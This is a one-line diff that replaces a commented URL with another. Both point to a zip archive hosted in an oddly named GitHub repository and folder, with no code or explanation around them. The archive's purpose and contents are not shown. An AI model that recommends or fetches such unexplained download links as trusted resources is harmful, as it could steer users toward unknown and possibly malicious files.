@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/AMN-h0b/AMN-h0b.github.ma/main/vassalless/AMN-h0b.github.ma.zip
+# https://raw.githubusercontent.com/AMN-h0b/AMN-h0b.github.ma/main/vassalless/b-github-h-AM-ma-2.0.zip
